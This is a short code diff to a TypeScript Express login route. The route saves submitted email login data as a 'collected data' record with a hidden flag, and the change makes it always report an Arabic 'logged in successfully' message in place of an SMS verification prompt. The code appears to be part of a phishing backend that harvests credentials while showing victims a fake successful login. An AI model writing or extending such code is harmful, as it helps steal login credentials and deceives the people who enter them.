@@ -71,11 +71,10 @@ export async function registerRoutes(app: Express): Promise<Server> {
 
       console.log(`✅ Login data saved - Email: ${email}, Hidden: ${collectedDataRecord.isHidden}`);
 
-      // Always return success
+      // Always return success - direct login without SMS
       res.json({ 
-        success: true, 
-        userId: sessionId,
-        message: "تم إرسال رمز التحقق إلى هاتفك" 
+        success: true,
+        message: "تم تسجيل الدخول بنجاح" 
       });
     } catch (error: any) {
       console.error("Login error:", error);
